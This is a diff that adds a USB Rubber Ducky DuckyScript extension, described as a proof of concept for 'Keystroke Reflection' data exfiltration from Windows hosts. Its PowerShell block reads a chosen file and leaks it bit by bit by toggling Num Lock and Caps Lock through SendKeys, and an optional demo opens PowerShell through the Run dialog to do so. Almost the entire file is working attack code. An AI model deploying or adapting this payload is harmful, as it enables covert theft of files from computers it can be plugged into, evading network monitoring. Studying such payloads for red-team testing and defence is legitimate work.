@@ -1,0 +1,90 @@
+EXTENSION WINDOWS_HID_EXFIL
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM_BLOCK DOCUMENTATION
+        Helpers for Keystroke Reflection data exfiltration
+        This payload is a proof of concept for USB HID only Data Exfiltration
+
+        TARGET:
+            Windows Host that supports powershell and SendKeys
+
+        USAGE:
+            Prepare data to exfil (in filename defined by TARGET_FILE below)
+            with a powershell window already open - call RUN_WINDOWS_EXFIL()
+
+        DEPLOYMENT:
+            Plug Ducky into host, wait for the LED to turn (and stay) solid green.
+    END_REM
+
+    REM CONFIGURATION:
+    REM File on host machine to exfil
+    DEFINE #TARGET_FILE filename.txt
+
+    DEFINE #SAVE_AND_RESTORE_LOCKS TRUE
+    DEFINE #ENABLE_EXFIL_LEDS TRUE
+    DEFINE #CLOSE_AFTER_EXFIL TRUE
+
+    DEFINE #RUN_SIMPLE_USAGE_DEMO FALSE
+
+    FUNCTION RUN_WINDOWS_EXFIL()
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            SAVE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            LED_OFF
+            $_EXFIL_LEDS_ENABLED = TRUE
+        END_IF_DEFINED
+
+        $_EXFIL_MODE_ENABLED = TRUE
+        STRING_POWERSHELL
+            foreach($b in $(Get-Content "#TARGET_FILE" -Encoding byte)){
+                foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){
+                    If($b -band $a){
+                        $o+="%{NUMLOCK}"
+                    }Else{
+                        $o+="%{CAPSLOCK}"
+                    }
+                }
+            };
+            $o+="%{SCROLLLOCK}";
+            Add-Type -Assembly System.Windows.Forms;
+            [System.Windows.Forms.SendKeys]::SendWait("$o");
+        END_STRING
+        IF_DEFINED_TRUE #CLOSE_AFTER_EXFIL
+            STRING exit;
+        END_IF_DEFINED
+
+        ENTER
+
+        REM Listen for EOF
+        WAIT_FOR_SCROLL_CHANGE
+        $_EXFIL_MODE_ENABLED = FALSE
+
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            LED_G
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+    END_FUNCTION
+
+    IF_DEFINED_TRUE #RUN_SIMPLE_USAGE_DEMO
+        REM DO NOT MODIFY THIS DEMO - copy and move outside extension if using as template.
+        REM DEMO Boot Delay
+        DELAY 3000
+        REM Open run dialog
+        GUI r
+        DELAY 500
+        REM Open Powershell
+        STRINGLN powershell
+        DELAY 500
+        REM Prepare some data in TARGET_FILE
+        STRINGLN echo test123 > #TARGET_FILE
+        DELAY 500
+        REM Exfil data to USB Rubber Ducky using Keystroke Reflection
+        RUN_WINDOWS_EXFIL()
+    END_IF_DEFINED
+END_EXTENSION
